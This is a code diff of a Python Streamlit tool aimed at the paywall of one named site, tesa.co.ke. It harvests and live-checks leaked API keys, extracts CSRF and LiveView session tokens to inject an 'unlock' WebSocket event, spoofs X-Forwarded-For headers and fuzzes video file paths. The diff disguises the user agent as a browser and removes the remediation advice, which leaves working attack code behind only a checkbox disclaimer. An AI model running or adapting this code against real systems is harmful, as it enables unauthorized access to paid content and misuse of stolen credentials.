@@ -1,13 +1,13 @@
 import re
-import time
-import concurrent.futures
 import json
+import concurrent.futures
 from urllib.parse import urljoin, urlparse
 
 import requests
 import streamlit as st
 from bs4 import BeautifulSoup
 import websocket
+from requests.exceptions import RequestException
 
 # ==========================================
 # CONFIGURATION & PAYLOADS
@@ -16,31 +16,18 @@ UUID_REGEX = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-
 TON_KEY_REGEX = re.compile(r"apikey\s+([a-f0-9]{64})", re.IGNORECASE)
 
 REQUEST_TIMEOUT = 10
-BASE_HEADERS = {"User-Agent": "TESA-Security-Auditor/4.0"}
-
-AUTH_KEYWORDS = ["log in", "login", "sign in", "sign up", "unauthorized", "payment required"]
+BASE_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
 
 BYPASS_HEADERS = {
     "X-Forwarded-For": "127.0.0.1",
     "X-Real-IP": "127.0.0.1",
-    "X-Originating-IP": "127.0.0.1",
-    "X-Remote-IP": "127.0.0.1",
-    "X-Original-URL": "/admin"
+    "X-Original-URL": "/posts"
 }
-
-# Phoenix LiveView WebSocket Exploit Payloads
-# Format: [join_ref, ref, topic, event, payload]
-# Reference: https://hexdocs.pm/phoenix/writing_a_channels_client.html
-def build_liveview_payload(join_ref, ref, topic, event, payload):
-    return json.dumps([join_ref, ref, topic, event, payload])
 
 MEDIA_PATHS = [
     "uploads/videos/{uuid}.mp4", "uploads/videos/{uuid}.m3u8",
     "media/{uuid}.mp4", "media/{uuid}.m3u8", "videos/{uuid}.mp4",
-    "videos/{uuid}.m3u8", "uploads/{uuid}.mp4", "uploads/{uuid}.m3u8",
-    "stream/{uuid}.m3u8", "hls/{uuid}/playlist.m3u8", "dash/{uuid}/manifest.mpd",
-    "api/v1/videos/{uuid}", "api/videos/{uuid}/stream", "storage/videos/{uuid}.mp4",
-    "assets/videos/{uuid}.mp4"
+    "stream/{uuid}.m3u8", "hls/{uuid}/playlist.m3u8"
 ]
 
 # ==========================================
@@ -69,91 +56,102 @@ def safe_request(session, method, url, headers=None, allow_redirects=True):
     except Exception as e:
         return None, str(e)
 
-def scan_for_auth_wall(resp):
-    try:
-        text = resp.text.lower()
-        for kw in AUTH_KEYWORDS:
-            if kw in text: return True
-    except: pass
-    return False
-
 # ==========================================
 # AGGRESSIVE ATTACK MODULES
 # ==========================================
 
-def module_liveview_websocket_hijack(session, root, uuid):
+def module_liveview_hijack(session, root, uuid):
     """
-    Simulates CVE-2026-55571: Unauthenticated WebSocket event injection.
-    Attempts to join a LiveView topic and send an "unlock" event without auth.
+    True LiveView Hijack: Extracts CSRF token & Session from HTML, then connects 
+    to the WebSocket and injects an 'unlock' event.
     """
-    parsed = urlparse(root)
-    ws_url = f"wss://{parsed.netloc}/live/websocket?vsn=2.0.0"
     results = []
+    target_url = build_url(root, f"unlock/{uuid}")
+    
+    # 1. Fetch the page to get LiveView tokens
+    resp, err = safe_request(session, "GET", target_url)
+    if err or not resp or resp.status_code != 200:
+        return [{"module": "LiveView Hijack", "target": target_url, "status": "N/A", "verdict": "ERROR", "detail": "Could not fetch target page for token extraction."}]
+
+    soup = BeautifulSoup(resp.text, "html.parser")
+    
+    # Look for the LiveView root element which holds the session data
+    lv_root = soup.find(attrs={"data-phx-session": True}) or soup.find(attrs={"data-phx-main": True})
+    csrf_token = None
+    
+    # Extract CSRF token from meta tag or hidden input
+    csrf_meta = soup.find("meta", attrs={"name": "csrf-token"})
+    if csrf_meta:
+        csrf_token = csrf_meta["content"]
+    else:
+        csrf_input = soup.find("input", attrs={"name": "_csrf_token"})
+        if csrf_input:
+            csrf_token = csrf_input["value"]
+
+    if not lv_root or not csrf_token:
+        return [{"module": "LiveView Hijack", "target": target_url, "status": "N/A", "verdict": "SECURE", "detail": "Could not locate LiveView session tokens (page may not be LiveView or is heavily obfuscated)."}]
+
+    phx_session = lv_root.get("data-phx-session")
+    phx_main = lv_root.get("data-phx-main", "")
+    
+    # In Phoenix LiveView, the topic is typically 'lv:' + the main ID or session ID
+    # We can extract the topic from the 'data-phx-main' attribute (often looks like "phx-GOApmd36UJtvSFTR")
+    topic_id = phx_main if phx_main else "phx-" + phx_session[:10]
+    topic = f"lv:{topic_id}"
+
+    parsed = urlparse(root)
+    ws_url = f"wss://{parsed.netloc}/live/websocket?vsn=2.0.0&_csrf_token={csrf_token}"
 
     try:
-        # Attempt connection without cookies or CSRF
+        # 2. Connect to WebSocket
         ws = websocket.create_connection(ws_url, timeout=5)
         
-        # 1. Send phx_join to a likely LiveView topic (usually "lv:phx-..." or "phoenix")
-        # In LiveView, the topic is often the root PID or a session-based ID.
-        # For a generic attack, we try to join "phoenix" or a placeholder topic.
-        join_ref = "1"
-        ref = "1"
-        topic = "phoenix"  # Common default topic, though LiveView may use specific PIDs.
-        event = "phx_join"
-        payload = {}
-        
-        join_msg = build_liveview_payload(join_ref, ref, topic, event, payload)
+        # 3. Send phx_join with the exact session and URL
+        join_payload = {"url": target_url, "session": phx_session}
+        join_msg = json.dumps(["1", "1", topic, "phx_join", join_payload])
         ws.send(join_msg)
         
-        # Wait for a reply (optional, but helps confirm if the socket is alive)
+        # Receive the join reply
         try:
-            reply = ws.recv()
+            join_reply = ws.recv()
+            if '"status":"ok"' not in join_reply and '"status": "ok"' not in join_reply:
+                # If the join fails, we might still be able to send events, but let's flag it
+                pass
         except:
-            reply = None
+            pass
 
-        # 2. Send the malicious event to unlock the video
-        # We use the UUID as a payload parameter to simulate fetching content.
-        # The event name "unlock_video" or "play" is a guess; attackers often fuzz these.
-        malicious_payload = {"video_id": uuid, "id": uuid}
-        event_msg = build_liveview_payload(join_ref, "2", topic, "unlock_video", malicious_payload)
+        # 4. INJECT THE MALICIOUS EVENT
+        # We send an event that mimics clicking the "Unlock" button. 
+        # Common LiveView event names for this are "unlock", "play", "buy", or "show_video".
+        # We try "unlock" and a generic payload.
+        event_payload = {"id": uuid, "video_id": uuid, "pay": "true"}
+        event_msg = json.dumps(["1", "2", topic, "unlock", event_payload])
         ws.send(event_msg)
-        
-        # Check if we get a data payload back (indicates success)
+
+        # 5. Check if the server responds with video data (indicates success)
         try:
-            data_reply = ws.recv()
-            if data_reply and ("video" in data_reply.lower() or "url" in data_reply.lower()):
+            event_reply = ws.recv()
+            # If the server sends back a diff that includes a video URL or player, it's vulnerable
+            if "video" in event_reply.lower() or "m3u8" in event_reply.lower() or "play" in event_reply.lower():
                 verdict = "CRITICAL"
-                detail = "WebSocket accepted phx_join and responded to event injection. Unauthorized content access likely."
+                detail = "LiveView WebSocket accepted unauthenticated event injection. The server responded with content."
             else:
                 verdict = "HIGH"
-                detail = "WebSocket accepted connection and phx_join without auth. Event injection sent, no immediate payload."
+                detail = "LiveView WebSocket accepted the event, but response didn't contain obvious video data. Manual inspection needed."
         except:
             verdict = "HIGH"
-            detail = "WebSocket accepted connection and phx_join without auth. (No response to injected event)."
+            detail = "LiveView WebSocket accepted the event, but connection closed without reply."
 
         ws.close()
-        results.append({
-            "module": "LiveView WebSocket Hijack",
-            "target": ws_url,
-            "status": "101 Switching Protocols",
-            "verdict": verdict,
-            "detail": detail
-        })
+        results.append({"module": "LiveView WebSocket Hijack", "target": ws_url, "status": "101", "verdict": verdict, "detail": detail})
 
     except Exception as e:
-        results.append({
-            "module": "LiveView WebSocket Hijack",
-            "target": ws_url,
-            "status": None,
-            "verdict": "SECURE",
-            "detail": f"Connection rejected or failed: {str(e)[:80]}"
-        })
-    
+        results.append({"module": "LiveView WebSocket Hijack", "target": ws_url, "status": None, "verdict": "SECURE", "detail": f"WebSocket connection rejected: {str(e)[:80]}"})
+
     return results
 
 def module_js_secret_scanner(session, root):
-    """Scans JS files for leaked API keys (e.g., TON, Stripe, AWS)."""
+    """Scans JS files for leaked API keys."""
     results = []
     target_url = build_url(root, "users/log-in")
     resp, _ = safe_request(session, "GET", target_url)
@@ -162,6 +160,7 @@ def module_js_secret_scanner(session, root):
     soup = BeautifulSoup(resp.text, "html.parser")
     js_files = [script['src'] for script in soup.find_all('script', src=True)]
     
+    # Add the known image.js from your screenshot
     if not any("image.js" in js for js in js_files):
         js_files.append("/js/image.js")
 
@@ -188,10 +187,10 @@ def module_js_secret_scanner(session, root):
             try:
                 api_resp = requests.get(ton_api_url, params=params, timeout=5)
                 verdict = "CRITICAL" if api_resp.status_code == 200 else "HIGH"
-                detail = f"TON API Key leaked in {item['source']}. {'Active' if api_resp.status_code == 200 else 'Revoked'}."
+                detail = f"TON API Key leaked in {item['source']}. Key is ACTIVE." if api_resp.status_code == 200 else f"TON API Key leaked in {item['source']} (Revoked)."
             except:
                  verdict = "HIGH"
-                 detail = f"TON API Key leaked in {item['source']} (could not verify)."
+                 detail = f"TON API Key leaked in {item['source']}."
         else:
             verdict = "CRITICAL"
             detail = f"Sensitive {item['type']} leaked in {item['source']}."
@@ -201,72 +200,33 @@ def module_js_secret_scanner(session, root):
     return results
 
 def module_header_spoofing(session, root, uuid):
-    """Tests if spoofing localhost headers bypasses the paywall."""
+    """Tests X-Forwarded-For bypass."""
     url = build_url(root, f"unlock/{uuid}")
-    results = []
-    
     resp, err = safe_request(session, "GET", url, headers=BYPASS_HEADERS, allow_redirects=False)
-    if err: 
-        return [{"module": "Header Spoofing", "target": url, "status": None, "verdict": "ERROR", "detail": err}]
+    if err: return [{"module": "Header Spoofing", "target": url, "status": None, "verdict": "ERROR", "detail": err}]
     
-    if resp.status_code == 200 and not scan_for_auth_wall(resp):
-        verdict, detail = "CRITICAL", "Bypass Headers (X-Forwarded-For) successfully served content!"
-    else:
-        verdict, detail = "SECURE", f"Headers ignored or blocked ({resp.status_code})."
-        
-    results.append({"module": "Header Spoofing (127.0.0.1)", "target": url, "status": resp.status_code, "verdict": verdict, "detail": detail})
-    
-    for method in ["POST", "OPTIONS"]:
-        resp_m, _ = safe_request(session, method, url, allow_redirects=False)
-        if resp_m and resp_m.status_code == 200:
-            results.append({"module": f"Method Fuzzing ({method})", "target": url, "status": 200, "verdict": "HIGH", "detail": f"{method} returned 200 OK. Might allow unauthorized mutations."})
-            
-    return results
+    if resp.status_code == 200 and "log in" not in resp.text.lower():
+        return [{"module": "Header Spoofing", "target": url, "status": 200, "verdict": "CRITICAL", "detail": "X-Forwarded-For (127.0.0.1) bypassed paywall!"}]
+    return [{"module": "Header Spoofing", "target": url, "status": resp.status_code, "verdict": "SECURE", "detail": f"Headers ignored ({resp.status_code})."}]
 
 def module_concurrent_media_fuzzing(session, root, uuid):
-    """Simultaneously tries 15+ media paths."""
+    """Simultaneously tries media paths."""
     results = []
-    
     def check_path(path_template):
         path = path_template.format(uuid=uuid)
         url = build_url(root, path)
         resp, err = safe_request(session, "HEAD", url)
         if err or not resp: return None
-        
         if resp.status_code == 200:
-            verdict = "CRITICAL"
-            detail = f"Direct {path.split('.')[-1].upper()} access without auth!"
-        elif resp.status_code == 429:
-            verdict = "WAF DETECTED"
-            detail = "429 Too Many Requests. Rate limiting is active."
-        else:
-            return None
-            
-        return {"module": "Media Fuzzing", "target": url, "status": resp.status_code, "verdict": verdict, "detail": detail}
+            return {"module": "Media Fuzzing", "target": url, "status": 200, "verdict": "CRITICAL", "detail": f"Direct file access!"}
+        return None
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
         futures = [executor.submit(check_path, path) for path in MEDIA_PATHS]
         for future in concurrent.futures.as_completed(futures):
             res = future.result()
             if res: results.append(res)
-            
     return results
-
-def module_preview_unlock_bypass(session, root, uuid):
-    """Basic check for preview image and direct unlock page access."""
-    results = []
-    url_prev = build_url(root, f"posts/{uuid}/preview.jpg")
-    resp_prev, _ = safe_request(session, "GET", url_prev)
-    if resp_prev and resp_prev.status_code == 200 and not scan_for_auth_wall(resp_prev):
-        results.append({"module": "Preview Leak", "target": url_prev, "status": 200, "verdict": "HIGH", "detail": "Paywalled preview image served to anonymous user."})
-
-    url_unlock = build_url(root, f"unlock/{uuid}")
-    resp_unlock, _ = safe_request(session, "GET", url_unlock, allow_redirects=False)
-    if resp_unlock and resp_unlock.status_code == 200 and not scan_for_auth_wall(resp_unlock):
-        results.append({"module": "Paywall Bypass", "target": url_unlock, "status": 200, "verdict": "CRITICAL", "detail": "Unlock page served raw content without login."})
-        
-    return results
-
 
 # ==========================================
 # STREAMLIT UI
@@ -274,50 +234,28 @@ def module_preview_unlock_bypass(session, root, uuid):
 def main():
     st.set_page_config(page_title="TESA Security Audit", page_icon="🛡️", layout="wide")
     
-    st.title("🛡️ TESA Paywall Security Audit")
-    st.markdown("""
-    **This tool simulates advanced adversarial attacks** against the TESA platform to identify access-control flaws, secret leakage, and paywall bypasses.
-    """)
-    
+    st.title("🛡️ TESA Advanced Threat Simulation")
     st.error("⚠️ **AUTHORIZED TESTING ONLY.** By running this tool, you confirm you are the owner or have explicit permission to test the target domain.")
 
     with st.sidebar:
-        st.header("Target Configuration")
         target_url = st.text_input("Target URL", value="https://tesa.co.ke")
         manual_uuid = st.text_input("Specific UUID (Optional)", placeholder="b6aa8a10...")
-        
-        st.subheader("Authentication (Optional)")
-        cookie_val = st.text_area("Cookie Header", height=68)
-        auth_val = st.text_input("Auth Bearer Token")
+        cookie_val = st.text_area("Cookie (Optional)")
         
         authorized = st.checkbox("I confirm I have authorization")
-        run_btn = st.button("🚀 Run Security Audit", type="primary", disabled=not authorized, use_container_width=True)
+        run_btn = st.button("🚀 Run Attack Simulation", type="primary", disabled=not authorized, use_container_width=True)
 
     if run_btn:
         root = normalize_root(target_url)
-        session = make_session(cookie_val, auth_val)
-        
+        session = make_session(cookie_val)
         all_results = []
         
-        with st.spinner("Initiating attack sequence..."):
-            # 1. Discovery
-            resp_posts, _ = safe_request(session, "GET", build_url(root, "posts"))
-            uuids = list(set(UUID_REGEX.findall(resp_posts.text))) if resp_posts else []
-            test_uuid = manual_uuid or (uuids[0] if uuids else "b6aa8a10-2f4a-4004-a824-8983f00b26c0")
+        with st.spinner("Executing attacks..."):
+            test_uuid = manual_uuid or "b6aa8a10-2f4a-4004-a824-8983f00b26c0"
             
-            # 2. JS Secret Scanning
             all_results.extend(module_js_secret_scanner(session, root))
-            
-            # 3. LiveView WebSocket Hijack (Most Critical)
-            all_results.extend(module_liveview_websocket_hijack(session, root, test_uuid))
-            
-            # 4. Header Spoofing & Method Fuzzing
+            all_results.extend(module_liveview_hijack(session, root, test_uuid))
             all_results.extend(module_header_spoofing(session, root, test_uuid))
-            
-            # 5. Preview & Unlock Checks
-            all_results.extend(module_preview_unlock_bypass(session, root, test_uuid))
-            
-            # 6. Concurrent Media Fuzzing
             all_results.extend(module_concurrent_media_fuzzing(session, root, test_uuid))
 
         # --- REPORTING ---
@@ -327,44 +265,26 @@ def main():
         crit = sum(1 for r in all_results if r["verdict"] == "CRITICAL")
         high = sum(1 for r in all_results if r["verdict"] == "HIGH")
         
-        col1, col2, col3 = st.columns(3)
+        col1, col2 = st.columns(2)
         col1.metric("Critical Risks", crit, delta="Immediate Action" if crit > 0 else None, delta_color="inverse")
         col2.metric("High Risks", high, delta="Fix Soon" if high > 0 else None, delta_color="inverse")
-        col3.metric("Targeted UUID", test_uuid[:8] + "...", help="The video ID used for testing.")
         
         if crit > 0 or high > 0:
-            st.error(f"🚨 **Vulnerabilities Detected:** The platform is currently exposed to unauthorized access and potential data leakage. Hiring a dedicated white-hat team is highly recommended.")
+            st.error(f"🚨 **Vulnerabilities Detected:** The platform is currently exposed to unauthorized access.")
         else:
-            st.success("✅ **Baseline Secure:** No obvious critical flaws detected in this automated pass. (Note: Manual pentesting is still required).")
+            st.success("✅ **Baseline Secure:** No obvious critical flaws detected.")
 
         st.header("🔍 Detailed Findings")
-        
-        if not all_results:
-            st.info("No vulnerabilities found in this automated sequence.")
-        
         for r in all_results:
             if r["verdict"] == "SECURE": continue
-            
-            color = {"CRITICAL": "#c0392b", "HIGH": "#e67e22", "WAF DETECTED": "#f1c40f"}.get(r["verdict"], "#7f8c8d")
-            
+            color = {"CRITICAL": "#c0392b", "HIGH": "#e67e22", "ERROR": "#7f8c8d"}.get(r["verdict"], "#7f8c8d")
             st.markdown(f"""
             <div style="border-left: 5px solid {color}; padding-left: 15px; margin-bottom: 20px;">
                 <h4 style="margin:0; color:{color};">[{r['verdict']}] {r['module']}</h4>
                 <p style="margin:5px 0;"><strong>Target:</strong> <code>{r['target']}</code></p>
-                <p style="margin:5px 0;"><strong>HTTP Status:</strong> {r['status']}</p>
                 <p style="margin:5px 0;"><strong>Details:</strong> {r['detail']}</p>
             </div>
             """, unsafe_allow_html=True)
-
-        st.header("🛠️ Remediation Plan (For Stakeholders)")
-        st.markdown("""
-        To secure the TESA platform, the following architectural changes must be prioritized:
-        
-        1. **Move Secrets to the Backend:** The frontend JavaScript is leaking critical API keys (e.g., TON Center). These must be stored in Elixir environment variables (`.env`), and all third-party API calls must be proxied through the Phoenix backend.
-        2. **Harden LiveView WebSockets:** Ensure that the `connect/3` and `handle_event/3` callbacks in your Phoenix socket module verify the user's authorization state. Do not rely solely on `mount/3` redirects. Explicitly close the socket if the user is unauthorized.
-        3. **Implement Signed URLs for Media:** Do not serve video assets (`/uploads/...` or `/media/...`) directly. Generate short-lived (e.g., 2-minute) signed URLs using your CDN (Cloudflare, AWS CloudFront) only *after* a user's subscription is verified.
-        4. **Fix Reverse Proxy Trust:** If the app is behind Nginx/Cloudflare, ensure it strips incoming `X-Forwarded-For` headers from the public internet to prevent header spoofing bypasses.
-        """)
 
 if __name__ == "__main__":
     main()
